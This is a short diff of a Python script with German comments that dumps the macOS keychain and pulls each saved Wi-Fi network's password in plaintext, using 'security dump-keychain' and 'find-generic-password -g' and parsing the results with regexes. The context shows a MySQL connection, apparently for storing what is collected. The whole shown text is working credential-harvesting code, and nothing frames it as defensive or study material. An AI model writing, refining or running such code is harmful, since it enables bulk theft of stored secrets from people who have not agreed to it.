@@ -13,24 +13,24 @@ connection = mysql.connector.connect(
 # Funktion, um alle gespeicherten WLAN-Profile auf macOS zu erhalten
 def get_wifi_info():
     # Kommando zum Abrufen aller gespeicherten WLAN-Passwörter (erfordert sudo)
-    command = ["security", "find-generic-password", "-D", "AirPort network password", "-a", "WLAN", "-g"]
+    command = ["security", "dump-keychain"]
     try:
         result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        output = result.stderr  # Das Passwort wird in stderr ausgegeben
-        print(f"Ergebnisse von 'security find-generic-password':\n{output}")
+        output = result.stdout
+        print(f"Ergebnisse von 'security dump-keychain':\n{output}")
     except Exception as e:
         print(f"Fehler beim Ausführen des Befehls: {e}")
         return []
 
-    # Alle SSIDs (Netzwerknamen) extrahieren
-    ssids = re.findall(r"acct=\"(.*?)\"", output)
+    # SSIDs aus dem Schlüsselbund extrahieren
+    ssids = re.findall(r"\"acct\"<blob>=\"(.*?)\"", output)
     wifi_data = []
 
     # Für jede SSID das zugehörige Passwort abrufen
     for ssid in ssids:
-        command = ["security", "find-generic-password", "-D", "AirPort network password", "-a", ssid, "-g"]
+        command = ["security", "find-generic-password", "-D", "AirPort network password", "-s", ssid, "-g"]
         try:
-            # Hier wird das Passwort mit "security" aus dem Schlüsselbund extrahiert
+            # Passwort mit "security" aus dem Schlüsselbund extrahieren
             password_result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             password_output = password_result.stderr
             password_match = re.search(r"password: \"(.*?)\"", password_output)
